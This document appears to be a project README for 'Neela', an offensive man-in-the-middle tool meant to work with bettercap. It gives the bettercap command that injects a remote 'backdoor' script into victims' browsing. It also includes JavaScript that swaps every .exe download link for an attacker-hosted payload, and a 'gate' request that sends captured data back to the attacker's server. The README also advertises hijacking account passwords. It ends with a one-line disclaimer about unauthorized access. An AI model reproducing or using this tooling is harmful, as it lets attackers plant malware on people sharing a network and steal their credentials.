
<img align="center" src ="https://s31.postimg.org/4s7r3ng0r/Neela_logo01_d.png" height="200" />
<br />

![Neela LAN](https://s31.postimg.org/40czeg3zv/home.png)

###### Resume:

Neela, MITM extension tools can execute a routine.

A routine is execution of multiple steps, for hijack download binary... hijack account password ... and more.

###### Require:
    - express
    - body-parser
    - colors
    - cookie-parser
    - cookie-session
    - dns
    - ent
    - express-session
    - ip
    - socket.io
    - os
    - request-ip

##### Start server

```javascript
node neela.js
```

![Neela](https://s31.postimg.org/46463yy8b/Capture_d_e_cran_2016_07_07_a_16_27_26.png)

##### Hacking with bettercap

```
--proxy-module injectjs --js-url "http://SERV_IP:3000/backdoor"
```

![bettercap with Neela](https://s32.postimg.org/duji0l405/Capture_d_e_cran_2016_07_07_a_16_25_50.png)

##### Make Routine & Hack !
* /exploit/routine

```javascript
if(document.getElementsByTagName('a') !== undefined){
  var list = document.getElementsByTagName('a');
  for(var x = 0;x < list.length;x++){
    console.log(list[x].href);
    var current = list[x].href;
    if(current.indexOf('.exe') > -1){
      list[x].href = 'http://IP_SERVER:3000/payload'
    }
  }
}

```

##### Gate receipt

```javascript
var req = new XMLHttpRequest();
req.open('GET', 'http://SERV_IP:3000/gate/'+encoded, false);
req.send(null);
```
![Neela](https://s31.postimg.org/wdfic47wr/Capture_d_e_cran_2016_07_07_a_15_32_28.png)

##### Replace download link
- Select replace_exe.neela routine
- Update /exploit/routine/exe/hacked.exe

![Neela replace](https://s31.postimg.org/worb3hngr/Capture_d_e_cran_2016_07_07_a_16_46_56.png)

##### Neela Logs

![Neela logs](https://s31.postimg.org/qgshncf17/logs.png)


reminder, infiltrate, monitor, computer system without authorization is a crime
